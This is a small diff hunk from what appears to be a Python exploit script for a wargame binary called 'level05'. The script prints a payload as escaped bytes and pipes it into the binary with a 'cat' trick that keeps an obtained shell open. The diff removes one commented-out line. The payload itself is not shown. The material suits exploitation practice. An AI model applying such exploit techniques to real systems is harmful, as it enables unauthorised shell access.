@@ -57,4 +57,3 @@ for c in payload:
     else:
         print(f'\\x{c:02x}', end='')
 print("'; cat) | ./level05")
-# print("' > /tmp/sexe)")
